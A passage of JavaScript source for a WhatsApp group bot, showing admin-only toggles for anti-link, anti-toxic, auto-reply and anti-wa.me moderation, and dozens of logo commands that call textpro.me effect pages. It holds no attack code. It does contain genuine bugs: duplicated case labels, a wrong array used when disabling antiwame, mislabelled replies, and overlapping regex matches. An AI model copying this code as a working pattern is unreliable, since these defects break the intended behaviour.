XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send any link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return m.reply('Already deactivated')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
m.reply('Success in turning off all antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case 'antitoxic': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (antiToxic) return m.reply('Already activated')
nttoxic.push(from)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
m.reply('Success in turning on antitoxic in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to use bad words in this group, one who uses will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiToxic) return m.reply('Already deactivated')
let off = nttoxic.indexOf(from)
nttoxic.splice(off, 1)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
m.reply('Success in turning off antitoxic in this group')
} else {
  let buttonsnttoxic= [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsnttoxic, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case 'autoreply': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (Autoreply) return m.reply('Already activated')
autorep.push(from)
fs.writeFileSync('./database/autoreply.json', JSON.stringify(autorep))
m.reply('Success in turning on auto reply in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nAuto reply has been enabled in this group, means bot may send unnecessary voice note!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Autoreply) return m.reply('Already deactivated')
let off = autorep.indexOf(from)
autorep.splice(off, 1)
fs.writeFileSync('./database/autoreply.json', JSON.stringify(autorep))
m.reply('Success in turning off auto reply in this group')
} else {
  let buttonsnttoxic= [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsnttoxic, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case 'antiwame': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (antiWame) return m.reply('Already activated')
ntwame.push(from)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
m.reply('Success in turning on antiwame in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send wa.me in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiWame) return m.reply('Already deactivated')
let off = nttoxic.indexOf(from)
ntwame.splice(off, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
m.reply('Success in turning off antiwame in this group')
} else {
  let buttonsntwame = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntwame, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case 'antilink': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (Antilinkgc) return m.reply('Already activated')
ntlinkgc.push(from)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
m.reply('Success in turning on antiwame in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Antilinkgc) return m.reply('Already deactivated')
let off = ntlinkgc.indexOf(from)
ntlinkgc.splice(off, 1)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
m.reply('Success in turning off antiwame in this group')
} else {
  let buttonsntwame = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntwame, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
//logo\\
case 'candy': case 'christmas': case '3dchristmas': case 'sparklechristmas':
case 'deepsea': case 'scifi': case 'rainbow2': case 'waterpipe': case 'spooky': 
case 'pencil': case 'circuit': case 'discovery': case 'metalic': case 'fiction': case 'demon': 
case 'transformer': case 'berry': case 'thunder': case '.': case '3dstone2': 
case 'neonlight': case 'glitch': case 'harrypotter': case 'brokenglass': case 'papercut': 
case 'watercolor': case 'multicolor': case 'neondevil': case 'underwater': case 'graffitibike':
 case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': 
case 'chocolate': case 'strawberry': case 'matrix': case 'blood': case 'dropwater': case 'toxic': 
case 'lava': case 'rockart': case 'bloodglas': case 'halloween': case 'darkgold': case 'joker': case 'wicker':
 case 'firework': case 'skeleton': case 'blackpinkart': case 'sand': case 'glue': case '1917': case 'leaves': case 'demon': {
             if (!q) throw `Example : ${prefix + command} ${global.ownername}`
             m.reply(mess.wait)
             let link
             if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
             if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
             if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
             if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
             if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
             if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
             if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
             if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
             if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
             if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
             if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
             if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
             if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
             if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
             if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
             if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
             if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
             if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
             if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
             if (/3dstone2/.test(command)) link = 'https://textpro.me/create-a-3d-stone-text-effect-online-for-free-1073.html'
             if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
             if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
             if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
             if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
             if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
             if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
             if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
             if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
             if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
             if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
             if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
             if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
             if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
             if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
             if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
             if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
             if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
             if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
             if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
             if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
             if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
             if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
             if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
             if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
             if (/rockart/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
             if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
             if (/halloween/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
             if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
             if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
             if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
             if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
             if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
             if (/blackpinkart/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
             if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
             if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
             if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
                if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'           
             let anutexpro = await maker.textpro(link, q)
                XeonBotInc.sendMessage(m.chat, { image: { url: anutexpro }, caption: `Made by ${global.botname}` }, { quoted: m })
             }
             break
case'glitch3':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case '3dbox':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
    `${q}`,])
.then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
.catch((err) => console.log(err));
break

case 'waterdrop':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
 maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
     `${q}`,])
    .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
    .catch((err) => console.log(err));
     break

case 'lion2':
  if(!q) throw `Use ${prefix + command} text`
  m.reply(mess.wait)
  maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
      `${q}`,])
     .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
     .catch((err) => console.log(err));
     break

case 'papercut':
      if(!q) throw `Use ${prefix + command} text`
      m.reply(mess.wait)
      maker.textpro("https://textpro.me/create-art-paper-cut-text-effect-online-1022.html", [
`${q}`,])
         .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
         .catch((err) => console.log(err));
         break

case 'transformer':
      if(!q) throw `Use ${prefix + command} text`
      m.reply(mess.wait)
      maker.textpro("https://textpro.me/create-a-transformer-text-effect-online-1035.html", [
`${q}`,])
.then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
.catch((err) => console.log(err));
break
   
case 'harrypot':
       if(!q) throw `Use ${prefix + command} text|text`
       m.reply(mess.wait)
       teks1 = q.split("|")[0]
       teks2 = q.split("|")[1]
       maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
 `${teks1}`,`${teks2}`])
 .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
 .catch((err) => console.log(err));
 break

case 'neondevil':
      if(!q) throw `Use ${prefix + command} text`
      m.reply(mess.wait)
      maker.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html", [
`${q}`,])
         .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
         .catch((err) => console.log(err));
         break

case '3dstone':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case '3davengers':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-avengers-logo-online-974.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'thunder':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   
case 'window':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

   case 'blackpinkneon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-neon-light-blackpink-logo-text-effect-online-1081.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'graffiti':
   case 'grafiti':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'pornhub2':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'blackpink2':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-blackpink-logo-style-online-1001.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'glitch':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'glitch2':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-glitch-text-effect-online-free-1026.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'glitch3':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case '3dspace':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'lion':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case '3dneon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-neon-light-text-effect-online-1028.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'neon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/neon-text-effect-online-879.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'greenneon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/green-neon-text-effect-874.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
    
case 'bokeh':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/bokeh-text-effect-876.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   
   

case 'holographic':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/holographic-3d-text-effect-975.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break



case 'bear':

if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'wolf':

if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-wolf-logo-galaxy-online-936.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'joker':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-logo-joker-online-934.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'dropwater2':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   
   case 'summertime':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-summer-neon-light-text-effect-online-1076.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'neonlight2':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'thewall':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/break-wall-text-effect-871.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   
case 'natural':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/natural-leaves-text-effect-931.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break 

case 'carbon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/carbon-text-effect-833.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'pencil':
if(!q) throw`Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'textmaker': {
   
if (args.length < 1) throw `Example :\n${prefix + command} <name>`
if (args[0] === 'glitch') {
if (args.length < 2) throw `Example :\n${prefix + command + ' ' + args[0]} ${global.ownername}`
let teds = await thiccysapi.textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [args[1]])
XeonBotInc.sendMessage(from, {image:{url:teds}, caption:"Done!"}, {quoted:m})
} else if (args[0] === 'glow') {
if (args.length < 2) throw `Example :\n${prefix + command + ' ' + args[0]} ${global.ownername}`
let teds = await thiccysapi.textpro("https://textpro.me/create-light-glow-sliced-text-effect-online-1068.html", [args[1]])
XeonBotInc.sendMessage(from, {image:{url:teds}, caption:"Done!"}, {quoted:m})
} else {
m.reply(`*Text Maker List :*\n•> glitch\n•> glow`)
}
}
break
case 'hoorror':{

     let link = `https://textpro.me/horror-blood-text-effect-online-883.html`
     let anui = await textpro(link, q)
     m.reply(`Wait a moment while making the logo about 1 minute`) 
     console.log(anui)
    XeonBotInc.sendMessage(from, {image:{url:anui}, caption:"Here you go!"}, {quoted:m})
}
   break
case 'whitebear':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'thunder2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-thunder-text-effect-online-881.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   break
case 'neon':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/neon-light-text-effect-online-882.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'matrix2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/matrix-style-text-effect-online-884.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'sky':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'magma':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-magma-hot-text-effect-online-1030.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'sand':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/sand-writing-text-effect-online-990.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'pencil':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'graffiti':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'metallic':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-metallic-text-effect-free-online-1041.html", [
    `${q}`,])
